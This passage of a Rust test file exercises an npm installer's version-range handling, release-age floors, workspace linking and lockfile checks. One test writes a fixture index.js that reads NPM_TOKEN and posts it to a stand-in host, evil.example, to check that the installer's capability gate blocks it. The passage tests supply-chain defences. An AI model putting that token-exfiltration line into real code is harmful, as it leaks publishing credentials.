//! `npm` domain tests, extracted from the original monolithic tests.rs.

use super::*;

#[test]
fn parses_npm_specs() {
    let spec = PackageSpec::parse("npm:left-pad@1.3.0").unwrap();
    assert_eq!(spec.ecosystem, Ecosystem::Npm);
    assert_eq!(spec.name, "left-pad");
    assert_eq!(spec.version.as_deref(), Some("1.3.0"));

    let spec = PackageSpec::parse("npm:@scope/pkg@2.0.0").unwrap();
    assert_eq!(spec.name, "@scope/pkg");
    assert_eq!(spec.version.as_deref(), Some("2.0.0"));
}

#[test]
fn resolves_common_npm_ranges() {
    assert!(npm_version_satisfies("6.0.0", "^6.0.0"));
    assert!(npm_version_satisfies("6.1.2", "^6.0.0"));
    assert!(!npm_version_satisfies("7.0.0", "^6.0.0"));
    assert!(npm_version_satisfies("1.2.9", "~1.2.0"));
    assert!(!npm_version_satisfies("1.3.0", "~1.2.0"));
    assert!(npm_version_satisfies("1.1.3", "^1.1.0,1.1.3"));
    assert!(!npm_version_satisfies("1.3.0", "^1.1.0,1.1.3"));
}

#[test]
fn resolves_npm_or_ranges() {
    // OR-ranges (`^3 || ^4`) — js-tokens via loose-envify, hence all React <=18.
    assert!(npm_version_satisfies("4.0.0", "^3.0.0 || ^4.0.0"));
    assert!(npm_version_satisfies("3.5.1", "^3.0.0 || ^4.0.0"));
    assert!(!npm_version_satisfies("5.0.0", "^3.0.0 || ^4.0.0"));
    // Whitespace around `||` and 3-way alternatives.
    assert!(npm_version_satisfies("2.4.0", "1.x||2.x || 3.x"));
    assert!(!npm_version_satisfies("4.0.0", "1.x||2.x || 3.x"));
}

#[test]
fn prerelease_only_satisfies_explicit_prerelease_ranges() {
    // A prerelease must NOT satisfy a plain range: `19.0.0-rc` sorts below
    // 19.0.0, so without the guard `^18.3.1` wrongly accepted it and react-dom's
    // `react: ^18.3.1` peer pulled a React 19 release candidate.
    assert!(!npm_version_satisfies("19.0.0-rc-abc", "^18.3.1"));
    assert!(!npm_version_satisfies("19.0.0-rc-abc", ">=18.3.1 <19.0.0"));
    assert!(!npm_version_satisfies("2.0.0-canary", "^1.0.0 || ^2.0.0"));
    assert!(!npm_version_satisfies("1.5.0-beta", "*"));
    // …but an explicit prerelease pin still resolves.
    assert!(npm_version_satisfies("19.0.0-rc-abc", "19.0.0-rc-abc"));
    // …and stable versions are unaffected.
    assert!(npm_version_satisfies("18.3.1", "^18.3.1"));
}

#[test]
fn resolves_npm_versions_before_publish_time() {
    let root: NpmRoot = serde_json::from_value(serde_json::json!({
            "dist-tags": {
                "latest": "2.0.0",
                "beta": "3.0.0-beta.1"
            },
            "time": {
                "1.0.0": "2023-01-01T00:00:00.000Z",
                "1.1.0": "2023-06-01T00:00:00.000Z",
                "2.0.0": "2024-01-01T00:00:00.000Z",
                "3.0.0-beta.1": "2024-02-01T00:00:00.000Z"
            },
            "versions": {
                "1.0.0": {
                    "version": "1.0.0",
                    "dist": { "tarball": "https://registry.example.invalid/demo/-/demo-1.0.0.tgz" }
                },
                "1.1.0": {
                    "version": "1.1.0",
                    "dist": { "tarball": "https://registry.example.invalid/demo/-/demo-1.1.0.tgz" }
                },
                "2.0.0": {
                    "version": "2.0.0",
                    "dist": { "tarball": "https://registry.example.invalid/demo/-/demo-2.0.0.tgz" }
                },
                "3.0.0-beta.1": {
                    "version": "3.0.0-beta.1",
                    "dist": { "tarball": "https://registry.example.invalid/demo/-/demo-3.0.0-beta.1.tgz" }
                }
            }
        }))
        .unwrap();

    assert_eq!(
        choose_npm_version("demo", "latest", &root, Some("2023-12-31T23:59:59Z")).unwrap(),
        "1.1.0"
    );
    assert_eq!(
        choose_npm_version("demo", "^1.0.0", &root, Some("2023-02-01")).unwrap(),
        "1.0.0"
    );
    assert!(choose_npm_version("demo", "2.0.0", &root, Some("2023-12-31T23:59:59Z")).is_err());
}

#[test]
fn parses_min_release_age_durations() {
    assert_eq!(parse_min_release_age(None).unwrap(), None);
    assert_eq!(
        parse_min_release_age(Some("14d")).unwrap(),
        Some(14 * 86_400)
    );
    assert_eq!(
        parse_min_release_age(Some("12h")).unwrap(),
        Some(12 * 3_600)
    );
    assert_eq!(parse_min_release_age(Some("0")).unwrap(), Some(0));
    // A malformed value fails closed (never silently disables the floor).
    assert!(parse_min_release_age(Some("soon")).is_err());
}

#[test]
fn effective_min_age_layers_dsl_over_project() {
    let dir = tempfile::tempdir().unwrap();
    let mut options = LinkOptions::new(dir.path());
    // Project/global floor of 14 days.
    options.min_release_age_secs = Some(14 * 86_400);
    // No DSL => the project floor applies to any package.
    assert_eq!(
        effective_min_age_secs(&options, Ecosystem::Npm, "left-pad"),
        Some(14 * 86_400)
    );
    // A DSL with a per-package override layers on top: `trusted` is exempted
    // (explicit 0 => no requirement), `slow` is tightened to 30d.
    options.policy_document = Some(
        omc_policy::parse(
            r#"
                package "trusted" { min-age "0" }
                package "slow" { min-age "30d" }
            "#,
        )
        .unwrap(),
    );
    assert_eq!(
        effective_min_age_secs(&options, Ecosystem::Npm, "left-pad"),
        Some(14 * 86_400) // unmatched => project floor
    );
    assert_eq!(
        effective_min_age_secs(&options, Ecosystem::Npm, "trusted"),
        None
    ); // exempted
    assert_eq!(
        effective_min_age_secs(&options, Ecosystem::Npm, "slow"),
        Some(30 * 86_400)
    );
}

#[test]
fn effective_npm_before_combines_age_and_explicit() {
    let dir = tempfile::tempdir().unwrap();
    let mut options = LinkOptions::new(dir.path());
    // No explicit config => the built-in 14-day default freshness floor applies,
    // so the cutoff is ~14 days ago (not None).
    let before = effective_npm_before(&options, "x").unwrap().unwrap();
    let parsed = parse_npm_before(&before).unwrap();
    let default_expected = Utc::now() - Duration::days(14);
    assert!(
        (parsed - default_expected).num_seconds().abs() < 120,
        "default 14d floor, got {before}"
    );

    // An explicit `0` relaxes the floor back to no cutoff.
    options.min_release_age_secs = Some(0);
    assert_eq!(effective_npm_before(&options, "x").unwrap(), None);

    // A 7-day min-age yields a cutoff ~7 days ago.
    options.min_release_age_secs = Some(7 * 86_400);
    let before = effective_npm_before(&options, "x").unwrap().unwrap();
    let parsed = parse_npm_before(&before).unwrap();
    let expected = Utc::now() - Duration::days(7);
    assert!(
        (parsed - expected).num_seconds().abs() < 120,
        "got {before}"
    );

    // An explicit far-past --before is more restrictive and wins.
    options.npm_before = Some("2020-01-01T00:00:00Z".to_owned());
    let before = effective_npm_before(&options, "x").unwrap().unwrap();
    let parsed = parse_npm_before(&before).unwrap();
    assert_eq!(parsed.format("%Y").to_string(), "2020");
}

#[test]
fn parses_npm_direct_tarball_specs() {
    let spec =
        PackageSpec::parse("npm:local-pkg @ https://example.invalid/local-pkg-1.0.0.tgz").unwrap();
    assert_eq!(spec.name, "local-pkg");
    assert_eq!(
        spec.direct_url.as_deref(),
        Some("https://example.invalid/local-pkg-1.0.0.tgz")
    );
}

#[test]
fn ignores_common_archive_metadata_paths() {
    assert!(is_ignorable_archive_metadata_path("pax_global_header"));
    assert!(is_ignorable_archive_metadata_path(
        "package/__MACOSX/._metadata"
    ));
    assert!(is_ignorable_archive_metadata_path("package/._index.js"));
    assert!(!is_ignorable_archive_metadata_path("package/index.js"));
}

#[test]
fn reused_node_modules_prunes_stale_root_packages() {
    let dir = tempfile::tempdir().unwrap();
    let node_modules = dir.path().join("node_modules");
    fs::create_dir_all(node_modules.join("keep")).unwrap();
    fs::create_dir_all(node_modules.join("stale")).unwrap();
    fs::create_dir_all(node_modules.join("@scope").join("keep")).unwrap();
    fs::create_dir_all(node_modules.join("@scope").join("stale")).unwrap();
    fs::create_dir_all(node_modules.join(".bin")).unwrap();
    fs::write(node_modules.join("keep").join("index.js"), "keep\n").unwrap();
    fs::write(
        node_modules.join("@scope").join("keep").join("index.js"),
        "keep\n",
    )
    .unwrap();

    let lock = OmcLock {
        packages: vec![
            locked_package_for_test(Ecosystem::Npm, "keep", "1.0.0"),
            locked_package_for_test(Ecosystem::Npm, "@scope/keep", "1.0.0"),
        ],
        ..OmcLock::default()
    };

    prune_npm_node_modules_to_lock(&node_modules, &lock).unwrap();

    assert!(node_modules.join("keep").exists());
    assert!(!node_modules.join("stale").exists());
    assert!(node_modules.join("@scope").join("keep").exists());
    assert!(!node_modules.join("@scope").join("stale").exists());
    assert!(node_modules.join(".bin").exists());
}

#[test]
fn parses_npm_direct_local_tarball_reference() {
    let dir = tempfile::tempdir().unwrap();
    let archive = dir.path().join("local-pkg-1.0.0.tgz");
    fs::write(
        &archive,
        npm_tgz_for_test(r#"{ "name": "local-pkg", "version": "1.0.0" }"#),
    )
    .unwrap();

    let spec = parse_npm_direct_archive_reference("./local-pkg-1.0.0.tgz", dir.path())
        .unwrap()
        .unwrap();

    assert_eq!(spec.name, "local-pkg");
    assert_eq!(spec.ecosystem, Ecosystem::Npm);
    assert!(spec.direct_url.as_deref().unwrap().starts_with("file://"));
    assert!(spec
        .direct_url
        .as_deref()
        .unwrap()
        .ends_with("/local-pkg-1.0.0.tgz"));
}

#[test]
fn reads_project_package_json_specs() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("vendor/local-dir")).unwrap();
    fs::create_dir_all(dir.path().join("vendor/linked-pkg")).unwrap();
    let package_json = dir.path().join("package.json");
    fs::write(
        &package_json,
        r#"{
                "scripts": { "check": "node -e \"console.log('ok')\"" },
                "dependencies": {
                    "is-odd": "3.0.1",
                    "local-dir": "file:vendor/local-dir",
                    "linked-pkg": "link:vendor/linked-pkg"
                },
                "devDependencies": { "which": "^2.0.2" },
                "optionalDependencies": {
                    "is-even": "1.0.0",
                    "local-pkg": "file:vendor/local-pkg-1.0.0.tgz",
                    "remote-pkg": "https://example.invalid/remote-pkg-2.0.0.tgz",
                    "workspace-pkg": "workspace:*"
                },
                "peerDependencies": {
                    "left-pad": "1.3.0",
                    "optional-peer": "1.0.0"
                },
                "peerDependenciesMeta": {
                    "optional-peer": { "optional": true }
                }
            }"#,
    )
    .unwrap();
    let specs = read_package_json_specs(&package_json, true).unwrap();
    assert!(specs
        .iter()
        .any(|spec| spec.name == "is-odd" && spec.version.as_deref() == Some("3.0.1")));
    assert!(specs
        .iter()
        .any(|spec| spec.name == "which" && spec.version.as_deref() == Some("^2.0.2")));
    assert!(specs
        .iter()
        .any(|spec| spec.name == "is-even" && spec.version.as_deref() == Some("1.0.0")));
    assert!(specs
        .iter()
        .any(|spec| spec.name == "left-pad" && spec.version.as_deref() == Some("1.3.0")));
    assert!(!specs.iter().any(|spec| spec.name == "optional-peer"));
    let local_pkg = specs.iter().find(|spec| spec.name == "local-pkg").unwrap();
    assert!(local_pkg
        .direct_url
        .as_deref()
        .unwrap()
        .starts_with("file://"));
    assert!(local_pkg
        .direct_url
        .as_deref()
        .unwrap()
        .ends_with("/vendor/local-pkg-1.0.0.tgz"));
    assert!(specs.iter().any(|spec| spec.name == "remote-pkg"
        && spec.direct_url.as_deref() == Some("https://example.invalid/remote-pkg-2.0.0.tgz")));
    assert!(!specs.iter().any(|spec| spec.name == "workspace-pkg"));
    assert!(!specs.iter().any(|spec| spec.name == "local-dir"));
    assert!(!specs.iter().any(|spec| spec.name == "linked-pkg"));

    let scripts = read_package_scripts(dir.path()).unwrap();
    assert_eq!(
        scripts.get("check").map(String::as_str),
        Some("node -e \"console.log('ok')\"")
    );

    let production_specs = read_package_json_specs(&package_json, false).unwrap();
    assert!(production_specs
        .iter()
        .any(|spec| spec.name == "is-odd" && spec.version.as_deref() == Some("3.0.1")));
    assert!(!production_specs.iter().any(|spec| spec.name == "which"));
}

#[test]
fn reads_package_json_overrides_and_resolutions_as_overrides() {
    let dir = tempfile::tempdir().unwrap();
    let package_json = dir.path().join("package.json");
    fs::write(
        &package_json,
        r#"{
                "dependencies": { "left-pad": "^1.0.0" },
                "overrides": {
                    "left-pad": "1.3.0",
                    "@scope/pkg@^2.0.0": { ".": "2.1.0", "transitive": "3.0.0" },
                    "ignored": "file:../ignored"
                },
                "resolutions": {
                    "**/ansi-regex": "5.0.1",
                    "@demo/tool": "4.0.0"
                }
            }"#,
    )
    .unwrap();

    let requirements =
        read_package_json_requirements(&package_json, DependencySelection::with_dev(true)).unwrap();
    assert_eq!(
        requirements
            .npm_overrides
            .get("npm:left-pad")
            .map(String::as_str),
        Some("1.3.0")
    );
    assert_eq!(
        requirements
            .npm_overrides
            .get("npm:@scope/pkg")
            .map(String::as_str),
        Some("2.1.0")
    );
    assert_eq!(
        requirements
            .npm_overrides
            .get("npm:transitive")
            .map(String::as_str),
        Some("3.0.0")
    );
    assert_eq!(
        requirements
            .npm_overrides
            .get("npm:ansi-regex")
            .map(String::as_str),
        Some("5.0.1")
    );
    assert_eq!(
        requirements
            .npm_overrides
            .get("npm:@demo/tool")
            .map(String::as_str),
        Some("4.0.0")
    );
    assert!(!requirements.npm_overrides.contains_key("npm:ignored"));
    assert!(requirements.constraints.is_empty());
}

#[test]
fn reads_workspace_package_json_specs() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("packages/api")).unwrap();
    fs::create_dir_all(dir.path().join("packages/ignored")).unwrap();
    fs::create_dir_all(dir.path().join("node_modules/nope")).unwrap();

    let package_json = dir.path().join("package.json");
    fs::write(
        &package_json,
        r#"{
                "name": "workspace-root",
                "workspaces": ["packages/*", "!packages/ignored"],
                "dependencies": { "root-dep": "1.0.0" },
                "devDependencies": { "root-dev": "2.0.0" }
            }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("packages/api/package.json"),
        r#"{
                "name": "api",
                "dependencies": { "workspace-dep": "3.0.0" },
                "devDependencies": { "workspace-dev": "4.0.0" }
            }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("packages/ignored/package.json"),
        r#"{ "dependencies": { "ignored-dep": "5.0.0" } }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("node_modules/nope/package.json"),
        r#"{ "dependencies": { "node-modules-dep": "6.0.0" } }"#,
    )
    .unwrap();

    let specs = read_package_json_specs(&package_json, true).unwrap();
    assert!(has_spec(&specs, "root-dep", "1.0.0"));
    assert!(has_spec(&specs, "root-dev", "2.0.0"));
    assert!(has_spec(&specs, "workspace-dep", "3.0.0"));
    assert!(has_spec(&specs, "workspace-dev", "4.0.0"));
    assert!(!specs.iter().any(|spec| spec.name == "ignored-dep"));
    assert!(!specs.iter().any(|spec| spec.name == "node-modules-dep"));

    let production_specs = read_package_json_specs(&package_json, false).unwrap();
    assert!(has_spec(&production_specs, "root-dep", "1.0.0"));
    assert!(has_spec(&production_specs, "workspace-dep", "3.0.0"));
    assert!(!production_specs.iter().any(|spec| spec.name == "root-dev"));
    assert!(!production_specs
        .iter()
        .any(|spec| spec.name == "workspace-dev"));
}

#[test]
fn installs_npm_workspace_links() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("packages/lib")).unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{
                "name": "workspace-root",
                "workspaces": ["packages/*"],
                "dependencies": { "@demo/lib": "workspace:*" }
            }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("packages/lib/package.json"),
        r#"{ "name": "@demo/lib", "main": "index.js", "bin": { "demo-lib": "cli.js" } }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("packages/lib/index.js"),
        "module.exports = 41;\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("packages/lib/cli.js"),
        "#!/usr/bin/env node\n",
    )
    .unwrap();

    let report = install_project(&LinkOptions::new(dir.path())).unwrap();
    assert_eq!(report.npm_packages, 0);
    assert_eq!(report.npm_bins, 1);
    assert_eq!(
        fs::read_to_string(dir.path().join("node_modules/@demo/lib/index.js")).unwrap(),
        "module.exports = 41;\n"
    );
    assert!(dir.path().join("node_modules/.bin/demo-lib").exists());
}

#[test]
fn installs_npm_root_package_bins() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{
                "name": "@demo/root",
                "bin": { "root-tool": "cli.js" }
            }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("cli.js"),
        "#!/usr/bin/env node\nconsole.log('root-tool-ok')\n",
    )
    .unwrap();

    let report = install_project(&LinkOptions::new(dir.path())).unwrap();
    assert_eq!(report.npm_packages, 0);
    assert_eq!(report.npm_bins, 1);

    let output = Command::new(dir.path().join("node_modules/.bin/root-tool"))
        .output()
        .unwrap();
    assert!(output.status.success());
    assert_eq!(
        String::from_utf8_lossy(&output.stdout).trim(),
        "root-tool-ok"
    );
}

#[test]
fn installs_npm_local_directory_links_respecting_omit_dev() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("vendor/local-pkg")).unwrap();
    fs::create_dir_all(dir.path().join("vendor/dev-pkg")).unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{
                "name": "local-link-root",
                "dependencies": { "local-pkg": "file:vendor/local-pkg" },
                "devDependencies": { "dev-pkg": "link:vendor/dev-pkg" }
            }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("vendor/local-pkg/index.js"),
        "module.exports = 41;\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("vendor/local-pkg/package.json"),
        r#"{ "name": "local-pkg", "bin": { "local-tool": "cli.js" } }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("vendor/local-pkg/cli.js"),
        "#!/usr/bin/env node\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("vendor/dev-pkg/index.js"),
        "module.exports = 42;\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("vendor/dev-pkg/package.json"),
        r#"{ "name": "dev-pkg", "bin": { "dev-tool": "cli.js" } }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("vendor/dev-pkg/cli.js"),
        "#!/usr/bin/env node\n",
    )
    .unwrap();

    let mut options = LinkOptions::new(dir.path());
    options.include_dev_dependencies = false;
    let report = install_project(&options).unwrap();
    assert_eq!(report.npm_bins, 1);
    assert_eq!(
        fs::read_to_string(dir.path().join("node_modules/local-pkg/index.js")).unwrap(),
        "module.exports = 41;\n"
    );
    assert!(dir.path().join("node_modules/.bin/local-tool").exists());
    assert!(!dir.path().join("node_modules/.bin/dev-tool").exists());
    assert!(!dir.path().join("node_modules/dev-pkg").exists());

    options.include_dev_dependencies = true;
    let report = install_project(&options).unwrap();
    assert_eq!(report.npm_bins, 2);
    assert_eq!(
        fs::read_to_string(dir.path().join("node_modules/dev-pkg/index.js")).unwrap(),
        "module.exports = 42;\n"
    );
    assert!(dir.path().join("node_modules/.bin/dev-tool").exists());
}

#[test]
fn install_project_compiles_npm_local_source_artifacts_before_linking() {
    let dir = tempfile::tempdir().unwrap();
    let local = dir.path().join("vendor/local-pkg");
    fs::create_dir_all(&local).unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{
                "name": "local-source-root",
                "dependencies": { "local-pkg": "file:vendor/local-pkg" }
            }"#,
    )
    .unwrap();
    fs::write(
        local.join("package.json"),
        r#"{ "name": "local-pkg", "version": "1.2.3" }"#,
    )
    .unwrap();
    fs::write(
            local.join("index.js"),
            "const token = process.env.NPM_TOKEN;\nfetch('https://evil.example/upload', { body: token });\n",
        )
        .unwrap();

    let error = install_project(&LinkOptions::new(dir.path())).unwrap_err();
    assert!(error
        .to_string()
        .contains("blocked package `npm:local-pkg@1.2.3 local source"));
    assert!(!dir.path().join("node_modules/local-pkg").exists());

    let mut options = LinkOptions::new(dir.path());
    options.allowed_capabilities = vec![
        Capability::EnvRead("NPM_TOKEN".to_owned()),
        Capability::HttpHost("evil.example".to_owned()),
    ];
    options
        .allowed_flows
        .push(parse_flow_rule("env:NPM_TOKEN->network:evil.example").unwrap());
    let report = install_project(&options).unwrap();

    assert_eq!(report.local_source_artifacts, 1);
    assert!(dir.path().join("node_modules/local-pkg").exists());
    let artifact_path = dir
        .path()
        .join(".omc/artifacts/npm/local-pkg/1.2.3/omc.json");
    let artifact: OmcArtifact =
        serde_json::from_str(&fs::read_to_string(&artifact_path).unwrap()).unwrap();
    verify_artifact_signature(&artifact).unwrap();
    assert_eq!(artifact.package.name, "local-pkg");
    assert_eq!(artifact.package.version, "1.2.3");
    assert_eq!(artifact.verdict, Verdict::Accepted);
    assert!(artifact.capabilities.iter().any(|finding| {
        finding.kind == CapabilityKind::EnvRead && finding.target == "NPM_TOKEN"
    }));
    let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
    assert_eq!(lock.local_sources.len(), 1);
    assert_eq!(lock.local_sources[0].name, "local-pkg");
    assert_eq!(lock.local_sources[0].version, "1.2.3");
    assert_eq!(lock.local_sources[0].sha256, artifact.source_sha256);

    let locked_artifact_json = fs::read_to_string(&artifact_path).unwrap();
    install_locked_project(&options).unwrap();
    assert_eq!(
        fs::read_to_string(&artifact_path).unwrap(),
        locked_artifact_json
    );
    fs::write(
            local.join("index.js"),
            "const token = process.env.NPM_TOKEN;\nfetch('https://evil.example/changed', { body: token });\n",
        )
        .unwrap();
    let error = install_locked_project(&options).unwrap_err();
    assert!(error
        .to_string()
        .contains("omc.lock does not satisfy `npm:local-pkg local source"));
    assert_eq!(
        fs::read_to_string(&artifact_path).unwrap(),
        locked_artifact_json
    );
}

#[test]
fn installs_recursive_npm_local_path_dependencies() {
    let dir = tempfile::tempdir().unwrap();
    let parent = dir.path().join("vendor/parent-pkg");
    let child = parent.join("child-pkg");
    fs::create_dir_all(&child).unwrap();
    fs::write(
        parent.join("package.json"),
        r#"{
                "name": "parent-pkg",
                "version": "1.0.0",
                "bin": { "parent-bin": "cli.js" },
                "dependencies": {
                    "child-pkg": "file:./child-pkg",
                    "tar-dep": "file:./tar-dep-1.0.0.tgz"
                }
            }"#,
    )
    .unwrap();
    fs::write(
        parent.join("index.js"),
        "module.exports = require('child-pkg');\n",
    )
    .unwrap();
    fs::write(
        parent.join("cli.js"),
        "#!/usr/bin/env node\nconsole.log(require('child-pkg'));\n",
    )
    .unwrap();
    fs::write(
        child.join("package.json"),
        r#"{ "name": "child-pkg", "version": "1.0.0" }"#,
    )
    .unwrap();
    fs::write(child.join("index.js"), "module.exports = 44;\n").unwrap();
    fs::write(
        parent.join("tar-dep-1.0.0.tgz"),
        npm_tgz_for_test(r#"{ "name": "tar-dep", "version": "1.0.0" }"#),
    )
    .unwrap();

    add_manifest_npm_local_paths(
        dir.path(),
        &[PathBuf::from("vendor/parent-pkg")],
        ManifestDependencyKind::Production,
    )
    .unwrap();

    let report = install_project(&LinkOptions::new(dir.path())).unwrap();

    assert_eq!(report.npm_packages, 1);
    assert!(dir.path().join("node_modules/parent-pkg").exists());
    assert!(dir.path().join("node_modules/child-pkg").exists());
    assert!(dir
        .path()
        .join("node_modules/tar-dep/package.json")
        .exists());
    let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
    assert!(lock
        .packages
        .iter()
        .any(|package| package.name == "tar-dep"));
    let output = Command::new(dir.path().join("node_modules/.bin/parent-bin"))
        .output()
        .unwrap();
    assert!(output.status.success());
    assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), "44");
}

#[test]
fn installs_package_json_local_directory_dependencies_recursively() {
    let dir = tempfile::tempdir().unwrap();
    let parent = dir.path().join("vendor/parent-pkg");
    let child = parent.join("child-pkg");
    fs::create_dir_all(&child).unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{
                "name": "local-dep-root",
                "dependencies": { "parent-pkg": "file:vendor/parent-pkg" }
            }"#,
    )
    .unwrap();
    fs::write(
        parent.join("package.json"),
        r#"{
                "name": "parent-pkg",
                "version": "1.0.0",
                "dependencies": {
                    "child-pkg": "file:./child-pkg",
                    "tar-dep": "file:./tar-dep-1.0.0.tgz"
                }
            }"#,
    )
    .unwrap();
    fs::write(
        parent.join("index.js"),
        "module.exports = require('child-pkg') + require('tar-dep');\n",
    )
    .unwrap();
    fs::write(
        child.join("package.json"),
        r#"{ "name": "child-pkg", "version": "1.0.0" }"#,
    )
    .unwrap();
    fs::write(child.join("index.js"), "module.exports = 20;\n").unwrap();
    fs::write(
        parent.join("tar-dep-1.0.0.tgz"),
        npm_tgz_for_test(r#"{ "name": "tar-dep", "version": "1.0.0" }"#),
    )
    .unwrap();

    install_project(&LinkOptions::new(dir.path())).unwrap();

    assert!(dir.path().join("node_modules/parent-pkg").exists());
    assert!(dir.path().join("node_modules/child-pkg").exists());
    assert!(dir
        .path()
        .join("node_modules/tar-dep/package.json")
        .exists());
    let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
    assert!(lock
        .packages
        .iter()
        .any(|package| package.name == "tar-dep"));
    assert!(lock
        .local_sources
        .iter()
        .any(|source| source.name == "parent-pkg"));
    assert!(lock
        .local_sources
        .iter()
        .any(|source| source.name == "child-pkg"));
}

#[test]
fn link_options_can_skip_project_requirement_discovery() {
    let dir = tempfile::tempdir().unwrap();
    let archive = dir.path().join("local-pkg-1.0.0.tgz");
    fs::write(
        &archive,
        npm_tgz_for_test(r#"{ "name": "local-pkg", "version": "1.0.0" }"#),
    )
    .unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{ "dependencies": { "local-pkg": "file:local-pkg-1.0.0.tgz" } }"#,
    )
    .unwrap();
    fs::write(dir.path().join("requirements.txt"), "requests==2.32.3\n").unwrap();

    let mut options = LinkOptions::new(dir.path());
    options.discover_project_requirements = false;
    let reports = lock_project(&options).unwrap();
    let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();

    assert!(reports.is_empty());
    assert!(lock.packages.is_empty());
}

#[test]
fn reads_workspace_package_json_specs_from_object_form() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("apps/web")).unwrap();

    let package_json = dir.path().join("package.json");
    fs::write(
        &package_json,
        r#"{
                "name": "workspace-root",
                "workspaces": {
                    "packages": ["apps/*"]
                }
            }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("apps/web/package.json"),
        r#"{ "name": "web", "dependencies": { "web-dep": "1.2.3" } }"#,
    )
    .unwrap();

    let specs = read_package_json_specs(&package_json, true).unwrap();
    assert!(has_spec(&specs, "web-dep", "1.2.3"));
}

#[test]
fn reads_npm_runtime_optional_and_peer_dependencies() {
    let version_doc = NpmVersion {
        version: "1.0.0".to_owned(),
        dist: NpmDist {
            tarball: "https://example.invalid/package.tgz".to_owned(),
            shasum: None,
            integrity: None,
        },
        os: None,
        cpu: None,
        libc: None,
        engines: None,
        scripts: None,
        dependencies: Some(BTreeMap::from([(
            "runtime".to_owned(),
            "^1.0.0".to_owned(),
        )])),
        optional_dependencies: Some(BTreeMap::from([(
            "optional-runtime".to_owned(),
            "^2.0.0".to_owned(),
        )])),
        bundle_dependencies: None,
        bundled_dependencies: None,
        peer_dependencies: Some(BTreeMap::from([
            ("required-peer".to_owned(), "^3.0.0".to_owned()),
            ("optional-peer".to_owned(), "^4.0.0".to_owned()),
        ])),
        peer_dependencies_meta: Some(BTreeMap::from([(
            "optional-peer".to_owned(),
            NpmPeerDependencyMeta { optional: true },
        )])),
    };

    let dependencies = npm_runtime_dependencies(&version_doc);
    assert!(dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "runtime"
            && dependency.spec.version.as_deref() == Some("^1.0.0")
            && !dependency.optional
            && !dependency.peer));
    assert!(dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "optional-runtime"
            && dependency.spec.version.as_deref() == Some("^2.0.0")
            && dependency.optional
            && !dependency.peer));
    assert!(dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "required-peer"
            && dependency.spec.version.as_deref() == Some("^3.0.0")
            && !dependency.optional
            && dependency.peer));
    assert!(!dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "optional-peer"));
}

#[test]
fn evaluates_npm_platform_lists() {
    assert!(npm_string_list_allows(
        Some(&NpmStringList::Many(vec![current_npm_os().to_owned()])),
        Some(current_npm_os())
    ));
    assert!(!npm_string_list_allows(
        Some(&NpmStringList::Many(vec![format!("!{}", current_npm_os())])),
        Some(current_npm_os())
    ));
    assert!(npm_string_list_allows(
        Some(&NpmStringList::Many(vec![
            "!definitely-not-this-os".to_owned()
        ])),
        Some(current_npm_os())
    ));
    assert!(!npm_string_list_allows(
        Some(&NpmStringList::Many(vec![
            "definitely-not-this-os".to_owned()
        ])),
        Some(current_npm_os())
    ));
}

#[test]
fn skips_npm_bundled_dependencies() {
    let version_doc = NpmVersion {
        version: "1.0.0".to_owned(),
        dist: NpmDist {
            tarball: "https://example.invalid/package.tgz".to_owned(),
            shasum: None,
            integrity: None,
        },
        os: None,
        cpu: None,
        libc: None,
        engines: None,
        scripts: None,
        dependencies: Some(BTreeMap::from([
            ("bundled-runtime".to_owned(), "^1.0.0".to_owned()),
            ("external-runtime".to_owned(), "^2.0.0".to_owned()),
        ])),
        optional_dependencies: Some(BTreeMap::from([(
            "bundled-optional".to_owned(),
            "^3.0.0".to_owned(),
        )])),
        bundle_dependencies: Some(NpmStringList::Many(vec![
            "bundled-runtime".to_owned(),
            "bundled-optional".to_owned(),
        ])),
        bundled_dependencies: None,
        peer_dependencies: None,
        peer_dependencies_meta: None,
    };

    let dependencies = npm_runtime_dependencies(&version_doc);
    assert!(dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "external-runtime"));
    assert!(!dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "bundled-runtime"));
    assert!(!dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "bundled-optional"));
}

#[test]
fn supports_boolean_npm_bundle_dependencies() {
    let version_doc = NpmVersion {
        version: "1.0.0".to_owned(),
        dist: NpmDist {
            tarball: "https://example.invalid/package.tgz".to_owned(),
            shasum: None,
            integrity: None,
        },
        os: None,
        cpu: None,
        libc: None,
        engines: None,
        scripts: None,
        dependencies: Some(BTreeMap::from([(
            "bundled-runtime".to_owned(),
            "^1.0.0".to_owned(),
        )])),
        optional_dependencies: None,
